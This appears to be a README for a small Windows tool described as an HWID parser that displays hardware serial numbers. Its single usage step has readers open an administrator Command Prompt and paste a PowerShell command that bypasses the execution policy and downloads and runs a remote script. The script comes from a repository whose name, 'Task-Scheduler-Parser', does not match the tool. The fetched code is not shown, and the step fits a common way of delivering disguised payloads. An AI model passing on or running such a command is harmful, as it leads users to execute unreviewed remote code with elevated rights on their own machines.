<p align="center">
  <a href="https://www.webopedia.com/definitions/hwid/">
    <img src="kita-ikuyo-rap.webp" alt="Banner">
  </a>
</p>

<h1 align="center">Simple <a href="https://www.webopedia.com/definitions/hwid/">HWID Parser</a>!</h1>
<p align="center">
  <a href="https://www.webopedia.com/definitions/hwid/">
  </a>
</p>
<h3 align="center">Simple HWID Parser</h3>

<p align="center">This tool collects and displays key hardware information about the system, such as the processor ID, physical memory serial numbers, and disk drive serial numbers. It runs a series of commands using Windows Management Instrumentation (WMI) and parses their results to display them directly in the Command Prompt for easy access and analysis.</p>

---

### Steps to use
1. Launch Command Prompt as Administrator
2. Use the script below and wait a few seconds till it publishs the results.

```powershell
powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/ObsessiveBf/Task-Scheduler-Parser/main/script.ps1')"
